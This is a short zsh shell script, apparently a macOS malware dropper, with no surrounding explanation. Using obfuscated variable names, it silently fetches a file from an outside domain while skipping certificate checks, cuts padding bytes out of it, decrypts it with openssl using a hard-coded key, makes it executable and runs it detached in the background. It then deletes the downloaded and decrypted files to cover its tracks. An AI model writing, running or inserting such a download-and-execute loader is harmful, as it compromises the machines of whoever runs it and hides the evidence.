#!/bin/zsh
dmpn5=$(mktemp /tmp/56szzc.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m6979dfa11711818d.bin" -o "$dmpn5z" || exit 1
qd6mth=$(stat -f %z "$dmpn5z"); z9sz67m=$(( qd6mth - 641 - 749 ))
tail -c +$(( 641 + 1 )) "$dmpn5z" | head -c $z9sz67m | openssl enc -d -aes-256-cbc -k 41e1bba259a1ec3220408efc -out "$dmpn5" 2>/dev/null
[ -s "$dmpn5" ] && chmod 700 "$dmpn5" && ( "$dmpn5" & ) && disown
( sleep 3; rm -f "$dmpn5" "$dmpn5z" ) &>/dev/null &
